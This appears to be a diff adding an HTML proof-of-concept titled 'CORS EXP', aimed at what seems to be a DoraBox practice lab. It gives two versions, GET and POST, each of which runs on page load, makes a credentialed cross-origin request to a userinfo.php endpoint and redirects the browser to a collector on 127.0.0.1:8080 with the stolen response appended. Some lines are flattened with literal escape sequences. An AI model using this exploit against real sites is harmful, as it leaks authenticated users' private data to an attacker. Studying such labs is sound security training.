@@ -1,0 +1,19 @@
+<!DOCTYPE html>\n<html>\n<head><title>CORS EXP</title></head>\n<body>\n</div>\n<script>\n  function cors(){\n    var xhttp = new XMLHttpRequest();\n    xhttp.onreadystatechange = function() {\n      if(this.readyState == 4 && this.status == 200) \n      {\n      document.location='http://127.0.0.1:8080?'+escape(this.responseText);\n      }\n    };\n    xhttp.open('GET','http://127.0.0.1/DoraBox/csrf/userinfo.php',true);\n    xhttp.withCredentials = true;\n    xhttp.send();\n  }\nwindow.onload = function (){\n  cors()\n}\n</script>\n</body>\n</html>
+
+
+<!DOCTYPE html>
+<html>
+<head><title>CORS EXP</title></head>
+<body>
+<script>
+  function cors(){
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function() {
+      if(this.readyState == 4 && this.status == 200) 
+      {
+      document.location='http://127.0.0.1:8080?'+escape(this.responseText);
+      }
+    };
+\n    var dataValue = "333";\n    xhttp.open('POST','http://127.0.0.1/DoraBox/csrf/userinfo.php',true);\n    xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");\n    xhttp.withCredentials = true;\n    xhttp.send(dataValue);\n  }\n\nwindow.onload = function (){\n  cors()\n}\n</script>\n</body>\n</html>
+
+         
